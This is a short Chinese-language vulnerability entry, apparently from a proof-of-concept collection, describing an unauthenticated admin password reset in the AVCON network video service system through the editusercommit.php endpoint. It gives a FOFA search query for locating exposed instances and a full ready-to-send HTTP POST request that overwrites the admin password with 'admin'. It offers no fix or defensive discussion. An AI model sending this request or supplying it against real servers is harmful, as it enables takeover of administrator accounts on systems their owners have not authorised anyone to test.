# AVCON-网络视频服务系统editusercommit.php存在任意用户重置密码漏洞

AVCON-网络视频服务系统通过接口 `/avcon/av_user/editusercommit.php?currentpage=1`  重置admin用户的密码，从而登录系统后台。

## fofa

```yaml
title=="avcon 网络视频会议系统"
```

## poc

```java
POST /avcon/av_user/editusercommit.php?currentpage=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 226
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=4

userid=admin&username=administration&password=admin&rpassword=admin&question=admin&answer=123&gender=%E7%94%B7&birthday=0000-00-00&edutypeid=0&phone=&mobile=&email=&address=&postcode=&go=-2&confirm=+++%E7%A1%AE%E5%AE%9A+++
```

